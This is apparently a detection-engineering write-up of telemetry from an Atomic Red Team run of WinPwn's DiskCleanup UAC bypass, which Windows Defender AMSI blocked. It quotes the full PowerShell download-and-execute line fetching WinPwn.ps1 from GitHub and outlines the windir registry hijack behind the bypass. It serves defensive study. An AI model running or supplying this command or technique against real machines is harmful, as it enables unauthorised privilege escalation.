# T1548.002-20: Bypass User Account Control — WinPwn - UAC Bypass DiskCleanup Technique

## Technique Context

T1548.002 (Bypass User Account Control) covers techniques for silently elevating process privileges. WinPwn's `DiskCleanup` UAC bypass technique exploits the Windows Disk Cleanup utility (`cleanmgr.exe`), which is auto-elevate and reads a registry-controlled command for its SAGE-based handler. By writing a hijacked command to `HKCU\Environment\windir` — pointing to a batch file that launches an attacker payload before the real `windir` path — an adversary can cause `cleanmgr.exe` to execute attacker-controlled code with elevated integrity. WinPwn implements this technique as a PowerShell function downloaded live from GitHub and invoked as `UACBypass -technique DiskCleanup`.

## What This Dataset Contains

The dataset captures approximately 9 seconds of activity on ACME-WS02 (Windows 11 Enterprise, domain member of acme.local).

**PowerShell script block logging (4104)** records the complete invocation:

```
{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup}
```

**PowerShell Event 4100** records the AMSI block:

```
This script contains malicious content and has been blocked by your antivirus software.
Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

Windows Defender's AMSI integration blocked `WinPwn.ps1` upon download, preventing the DiskCleanup technique from executing.

**Sysmon Event 22** (DNS query): `raw.githubusercontent.com` resolved to 185.199.108–111.133 (QueryStatus: 0 — success).

**Sysmon Event 3** is absent from this dataset (unlike tests 18 and 19), which may indicate the DNS query returned results but the TCP connection did not complete before the block, or that the connection event fell outside the collection window.

**Sysmon Event 1**: `whoami.exe` (pre-check, SYSTEM) and `powershell.exe` (the attack process).

**Sysmon Events 7, 10, 11, 17**: DLL loads, process access to `whoami.exe`, PowerShell profile file creation, named pipe — consistent with the ART test framework environment across all WinPwn tests.

**PowerShell 4103**: `Set-ExecutionPolicy -Bypass -Scope Process -Force` (ART test framework boilerplate, two instances) and `New-Object -TypeName net.webclient`.

## What This Dataset Does Not Contain (and Why)

**No DiskCleanup technique execution**: AMSI blocked WinPwn.ps1 at the `iex` call. The `HKCU\Environment\windir` registry manipulation and `cleanmgr.exe` invocation that characterize this technique never occurred.

**No `cleanmgr.exe` or elevated `cmd.exe` process creation**: The DiskCleanup bypass relies on `cleanmgr.exe` being auto-elevated and reading the hijacked `windir` environment variable. Since the technique did not execute, neither of these appear.

**No Sysmon Event 3 for this test**: The TCP connection to GitHub either did not establish within the capture window, was not captured due to the very short blocking window, or AMSI fired before the connection completed. The DNS resolution (Event 22) is present.

**No WinPwn function code in script blocks**: The AMSI block prevented WinPwn's function definitions from being parsed and logged.

## Assessment

The DiskCleanup WinPwn technique was blocked by Windows Defender AMSI in the same manner as the magic (test 18) and ccmstp (test 19) variants. This dataset is the third in a consecutive series of WinPwn AMSI-block captures, differing only in the technique name and the presence or absence of the TCP connection event. The consistent blocking behavior across WinPwn techniques demonstrates that Defender's signature for WinPwn.ps1 is robust to variant switching. The DNS event confirms that the download was attempted even when no TCP event appears.

## Detection Opportunities Present in This Data

- **PowerShell 4104**: `iex(new-object net.webclient).downloadstring(...)` with a WinPwn GitHub URL and `UACBypass ... -technique DiskCleanup` is a direct behavioral signature.
- **PowerShell 4100**: `ScriptContainedMaliciousContent` from `InvokeExpressionCommand` is a reliable high-confidence indicator, especially when co-occurring with a GitHub download in the same session.
- **Sysmon Event 22**: DNS query for `raw.githubusercontent.com` from `powershell.exe` under SYSTEM is a detection anchor even when no TCP connection event appears, demonstrating that DNS-only telemetry can surface this activity.
- **Cross-test correlation**: Detections keyed on the specific WinPwn commit hash URL (`121dcee26a7aca368821563cbe92b2b5638c5773`) will match tests 18, 19, 20, and 21 consistently, as all four use the same pinned version.
- **AMSI block + GitHub download**: The combination of a PowerShell AMSI block (4100) and a DNS query for `raw.githubusercontent.com` within the same process session is a highly specific detection for live-off-the-web PowerShell attacks.
